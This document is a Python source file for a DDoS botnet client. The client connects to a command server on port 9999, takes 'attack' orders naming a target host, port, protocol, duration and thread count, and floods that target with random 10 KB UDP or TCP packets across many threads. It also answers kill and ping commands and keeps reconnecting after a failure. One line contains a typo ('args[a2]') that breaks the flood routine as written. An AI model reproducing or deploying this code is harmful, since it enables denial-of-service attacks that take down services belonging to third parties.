import subprocess
import threading
import time
import socket
import os, sys, random

class Client():
	send=0
	run=False
	def __init__(self):
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host ,port= '127.0.0.1',9999
		self.s.connect((host, port))
		self.start()
	def __ddos(self,*args):
		def dos(*args):
			t1=time.time()
			host,port=args[1],args[a2]
			if args[0] == "udp":s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			else:s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			bytes=random._urandom(10240)
			s.connect((host, int(port)))
			while True:
				if not self.run:break
				s.sendto(bytes, (host,int(port)))
				self.send+=1
				#print(str(send)+" Packets Sended Sucessful")
			s.close()
			print("run time {}".format(time.time()-t1))
		for n in range(int(args[4])):
			threading.Thread(target = dos,args=[*args]).start()
		time.sleep(int(args[3]))
		self.run=False
	def start(self):
		while True:
			data = self.s.recv(1024)
			data=data[:].decode("utf-8")
			data=data.lower()
			if "attack" in data:
				self.s.send(str.encode("done"))
				data=data.replace("attack ","")
				data=data.split()
				self.run=True
				threading.Thread(target = self.__ddos,args=data).start()
			elif "kill" in data:
				self.run=False
				self.s.send(str.encode("Server Stopped"))
			elif "ping" in data:
				self.s.send(str.encode("kong"))
			else:self.s.send(str.encode("ERROR"))


if __name__ == '__main__':
	def main():
		try:
			print("Connecting...")
			Client()
		except:
			print("Failed.... 10 Second wait")
			time.sleep(10)
			main()
	main()
